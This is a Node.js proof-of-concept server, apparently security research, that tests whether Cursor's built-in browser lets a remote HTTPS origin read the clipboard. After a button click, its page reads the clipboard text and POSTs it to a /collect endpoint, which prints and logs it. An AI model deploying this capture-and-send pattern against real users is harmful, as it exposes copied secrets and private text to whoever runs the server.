#!/usr/bin/env node

/*
 * Cursor built-in browser clipboard validation harness
 *
 * Purpose:
 *   Cleanly validate whether Cursor's built-in browser permits clipboard reads
 *   from a given origin, especially a real remote HTTPS origin.
 *
 * Notes:
 *   - http://localhost is a trustworthy context in Chromium and is useful for
 *     local validation.
 *   - http://public-ip is not a meaningful remote clipboard test because it is
 *     typically not a secure context.
 *   - For remote testing, prefer https://hostname with a valid certificate.
 *
 * Usage:
 *   node pocs/cursor_browser_clipboard_server.js
 *   node pocs/cursor_browser_clipboard_server.js --host 0.0.0.0 --port 18777
 *   node pocs/cursor_browser_clipboard_server.js --host 0.0.0.0 --port 443 \
 *     --tls-cert cert.pem --tls-key key.pem
 */

"use strict";

const fs = require("fs");
const http = require("http");
const https = require("https");
const path = require("path");
const { URL } = require("url");

const DEFAULT_HOST = "localhost";
const DEFAULT_PORT = 18777;
const OUT_DIR = path.join(__dirname, "out");
const LOG_PATH = path.join(OUT_DIR, "cursor_browser_clipboard_hits.jsonl");

function parseArgs(argv) {
  let host = DEFAULT_HOST;
  let port = DEFAULT_PORT;
  let tlsCert;
  let tlsKey;

  for (let i = 0; i < argv.length; i += 1) {
    const arg = argv[i];
    if (arg === "--host" && argv[i + 1]) {
      host = argv[i + 1];
      i += 1;
      continue;
    }
    if (arg === "--port" && argv[i + 1]) {
      const parsed = Number.parseInt(argv[i + 1], 10);
      if (Number.isInteger(parsed) && parsed > 0 && parsed < 65536) {
        port = parsed;
      }
      i += 1;
      continue;
    }
    if (arg === "--tls-cert" && argv[i + 1]) {
      tlsCert = argv[i + 1];
      i += 1;
      continue;
    }
    if (arg === "--tls-key" && argv[i + 1]) {
      tlsKey = argv[i + 1];
      i += 1;
    }
  }

  return { host, port, tlsCert, tlsKey };
}

function escapeHtml(value) {
  return String(value)
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#39;");
}

function renderPage(origin, transport) {
  const safeOrigin = escapeHtml(origin);
  const safeTransport = escapeHtml(transport.toUpperCase());
  return `<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Cursor Clipboard Validation Harness</title>
  <style>
    :root {
      color-scheme: dark;
      --bg: #0a0f17;
      --panel: #101925;
      --panel-2: #172436;
      --border: #2a3d59;
      --text: #eaf0f7;
      --muted: #8ea0b7;
      --ok: #61d095;
      --warn: #ffbf69;
      --err: #ff7b72;
      --accent: #78a8ff;
      --mono: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
    }
    * { box-sizing: border-box; }
    body {
      margin: 0;
      min-height: 100vh;
      background:
        radial-gradient(circle at top left, rgba(120, 168, 255, 0.16), transparent 30%),
        linear-gradient(180deg, #08111c 0%, var(--bg) 100%);
      color: var(--text);
      font: 14px/1.55 var(--mono);
    }
    main {
      max-width: 980px;
      margin: 40px auto;
      padding: 0 20px;
    }
    .panel {
      background: linear-gradient(180deg, rgba(16, 25, 37, 0.98), rgba(10, 15, 23, 0.98));
      border: 1px solid var(--border);
      border-radius: 18px;
      box-shadow: 0 18px 60px rgba(0, 0, 0, 0.30);
      overflow: hidden;
    }
    .hero {
      padding: 24px 24px 18px;
      border-bottom: 1px solid var(--border);
      background: linear-gradient(180deg, rgba(23, 36, 54, 0.9), rgba(16, 25, 37, 0.3));
    }
    h1 {
      margin: 0 0 8px;
      font-size: 24px;
      line-height: 1.1;
      letter-spacing: -0.03em;
    }
    p {
      margin: 0;
      color: var(--muted);
    }
    .content {
      padding: 22px 24px 24px;
    }
    .grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
      gap: 10px;
      margin-bottom: 18px;
    }
    .cell {
      background: rgba(18, 29, 43, 0.9);
      border: 1px solid var(--border);
      border-radius: 12px;
      padding: 12px 14px;
      overflow-wrap: anywhere;
    }
    .label {
      display: block;
      margin-bottom: 6px;
      color: var(--muted);
      font-size: 11px;
      letter-spacing: 0.08em;
      text-transform: uppercase;
    }
    .actions {
      display: flex;
      gap: 10px;
      margin-bottom: 16px;
      flex-wrap: wrap;
    }
    button {
      appearance: none;
      border: 1px solid var(--border);
      background: linear-gradient(180deg, #1d2c42, #162233);
      color: var(--text);
      border-radius: 999px;
      padding: 12px 18px;
      font: inherit;
      cursor: pointer;
    }
    button:hover {
      border-color: #446289;
      transform: translateY(-1px);
    }
    pre {
      margin: 0;
      min-height: 280px;
      padding: 16px;
      border-radius: 14px;
      border: 1px solid var(--border);
      background: rgba(7, 12, 18, 0.95);
      white-space: pre-wrap;
      overflow-wrap: anywhere;
    }
    .ok { color: var(--ok); }
    .warn { color: var(--warn); }
    .err { color: var(--err); }
    .muted { color: var(--muted); }
    code { color: var(--accent); }
  </style>
</head>
<body>
  <main>
    <section class="panel">
      <div class="hero">
        <h1>Cursor Clipboard Validation Harness</h1>
        <p>
          Use this page inside Cursor's built-in browser to test whether a given
          origin can read clipboard data after an explicit user click.
        </p>
      </div>
      <div class="content">
        <div class="grid">
          <div class="cell"><span class="label">Origin</span><span id="origin">${safeOrigin}</span></div>
          <div class="cell"><span class="label">Transport</span><span id="transport">${safeTransport}</span></div>
          <div class="cell"><span class="label">Secure Context</span><span id="secure">pending</span></div>
          <div class="cell"><span class="label">Clipboard API</span><span id="api">pending</span></div>
          <div class="cell"><span class="label">Permission State</span><span id="perm">pending</span></div>
          <div class="cell"><span class="label">User Activation</span><span id="activation">pending</span></div>
        </div>

        <div class="actions">
          <button id="probe">Probe Environment</button>
          <button id="read">Read Clipboard And POST</button>
        </div>

        <pre id="log"></pre>
      </div>
    </section>
  </main>
  <script>
    (() => {
      "use strict";

      const logNode = document.getElementById("log");
      const secureNode = document.getElementById("secure");
      const apiNode = document.getElementById("api");
      const permNode = document.getElementById("perm");
      const activationNode = document.getElementById("activation");
      const probeButton = document.getElementById("probe");
      const readButton = document.getElementById("read");

      function write(line, klass) {
        const span = document.createElement("span");
        if (klass) span.className = klass;
        span.textContent = "[" + new Date().toISOString() + "] " + line + "\\n";
        logNode.appendChild(span);
        logNode.scrollTop = logNode.scrollHeight;
      }

      function activationState() {
        const ua = navigator.userActivation;
        if (!ua) {
          return "unavailable";
        }
        return "isActive=" + String(ua.isActive) + ", hasBeenActive=" + String(ua.hasBeenActive);
      }

      async function permissionState() {
        if (!navigator.permissions || !navigator.permissions.query) {
          return "unavailable";
        }
        try {
          const status = await navigator.permissions.query({ name: "clipboard-read" });
          return status.state;
        } catch (error) {
          return "query-error: " + String(error);
        }
      }

      async function probe() {
        const secure = window.isSecureContext;
        const hasClipboard = !!(navigator.clipboard && navigator.clipboard.readText);
        const perm = await permissionState();
        const activation = activationState();

        secureNode.textContent = String(secure);
        apiNode.textContent = hasClipboard ? "available" : "unavailable";
        permNode.textContent = perm;
        activationNode.textContent = activation;

        write("href=" + location.href);
        write("origin=" + location.origin);
        write("isSecureContext=" + String(secure), secure ? "ok" : "warn");
        write("clipboard API=" + (hasClipboard ? "available" : "unavailable"), hasClipboard ? "ok" : "warn");
        write("clipboard-read permission=" + perm, perm === "granted" ? "ok" : "warn");
        write("userActivation=" + activation, "muted");

        return { secure, hasClipboard, perm, activation };
      }

      async function readAndPost(trigger) {
        readButton.disabled = true;
        try {
          const state = await probe();
          if (!state.hasClipboard) {
            write("navigator.clipboard.readText() unavailable on this origin", "err");
            return;
          }

          let text;
          try {
            text = await navigator.clipboard.readText();
            write("clipboard.readText() => " + JSON.stringify(text), "ok");
          } catch (error) {
            write("clipboard.readText() failed: " + String(error), "err");
            return;
          }

          const payload = {
            trigger,
            href: location.href,
            origin: location.origin,
            transport: location.protocol,
            secureContext: window.isSecureContext,
            clipboardApiAvailable: !!(navigator.clipboard && navigator.clipboard.readText),
            permission: await permissionState(),
            userActivation: activationState(),
            text,
            ua: navigator.userAgent,
            ts: new Date().toISOString()
          };

          const response = await fetch("/collect", {
            method: "POST",
            headers: { "content-type": "application/json" },
            body: JSON.stringify(payload)
          });
          const json = await response.json();
          if (!response.ok) {
            throw new Error("collector returned HTTP " + response.status + ": " + JSON.stringify(json));
          }

          write("collector acknowledged id=" + json.id, "ok");
        } catch (error) {
          write("read/post failed: " + String(error), "err");
        } finally {
          readButton.disabled = false;
        }
      }

      probeButton.addEventListener("click", () => {
        probe().catch(error => write("probe failed: " + String(error), "err"));
      });

      readButton.addEventListener("click", () => {
        readAndPost("manual-click");
      });

      write("page loaded", "muted");
      probe().catch(error => write("initial probe failed: " + String(error), "err"));
    })();
  </script>
</body>
</html>`;
}

function readJsonBody(req) {
  return new Promise((resolve, reject) => {
    let body = "";
    req.setEncoding("utf8");
    req.on("data", chunk => {
      body += chunk;
      if (body.length > 1024 * 1024) {
        reject(new Error("request body too large"));
        req.destroy();
      }
    });
    req.on("end", () => {
      try {
        resolve(JSON.parse(body || "{}"));
      } catch (error) {
        reject(error);
      }
    });
    req.on("error", reject);
  });
}

function sendJson(res, statusCode, payload) {
  const body = JSON.stringify(payload, null, 2);
  res.writeHead(statusCode, {
    "content-type": "application/json; charset=utf-8",
    "cache-control": "no-store"
  });
  res.end(body);
}

function sendHtml(res, html) {
  res.writeHead(200, {
    "content-type": "text/html; charset=utf-8",
    "cache-control": "no-store"
  });
  res.end(html);
}

function appendHit(entry) {
  fs.mkdirSync(OUT_DIR, { recursive: true });
  fs.appendFileSync(LOG_PATH, JSON.stringify(entry) + "\n", "utf8");
}

function createServer(options) {
  const transport = options.tlsCert && options.tlsKey ? "https" : "http";

  const handler = async (req, res) => {
    const origin = `${transport}://${options.host}:${options.port}`;
    const requestUrl = new URL(req.url || "/", origin);

    if (req.method === "GET" && requestUrl.pathname === "/") {
      sendHtml(res, renderPage(origin, transport));
      return;
    }

    if (req.method === "GET" && requestUrl.pathname === "/healthz") {
      sendJson(res, 200, { ok: true, transport, origin });
      return;
    }

    if (req.method === "POST" && requestUrl.pathname === "/collect") {
      try {
        const body = await readJsonBody(req);
        const entry = {
          id: `${Date.now()}-${Math.random().toString(16).slice(2, 10)}`,
          remoteAddress: req.socket.remoteAddress,
          ...body
        };
        appendHit(entry);
        console.log("");
        console.log("  [HIT] %s", new Date().toISOString());
        console.log("  id         : %s", entry.id);
        console.log("  trigger    : %s", entry.trigger || "?");
        console.log("  secure     : %s", String(entry.secureContext));
        console.log("  permission : %s", entry.permission || "?");
        console.log("  activation : %s", entry.userActivation || "?");
        console.log("  transport  : %s", entry.transport || "?");
        console.log("  text       : %j", entry.text || "");
        console.log("  origin     : %s", entry.origin || "?");
        console.log("  log        : %s", LOG_PATH);
        console.log("");
        sendJson(res, 200, { ok: true, id: entry.id });
      } catch (error) {
        sendJson(res, 400, { ok: false, error: String(error) });
      }
      return;
    }

    sendJson(res, 404, { ok: false, error: "not found" });
  };

  if (transport === "https") {
    const tlsOptions = {
      cert: fs.readFileSync(options.tlsCert),
      key: fs.readFileSync(options.tlsKey)
    };
    return { transport, server: https.createServer(tlsOptions, handler) };
  }

  return { transport, server: http.createServer(handler) };
}

function main() {
  const options = parseArgs(process.argv.slice(2));
  const { transport, server } = createServer(options);

  server.listen(options.port, options.host, () => {
    console.log("");
    console.log("  Cursor clipboard validation harness");
    console.log("  transport : %s", transport);
    console.log("  listener  : %s://%s:%d/", transport, options.host, options.port);
    console.log("  log       : %s", LOG_PATH);
    console.log("");
    if (transport === "http") {
      console.log("  Use localhost for local secure-context testing.");
      console.log("  For remote testing, prefer HTTPS on a real hostname.");
    } else {
      console.log("  HTTPS mode is active.");
      console.log("  This is the preferred setup for remote-origin validation.");
    }
    console.log("");
  });
}

main();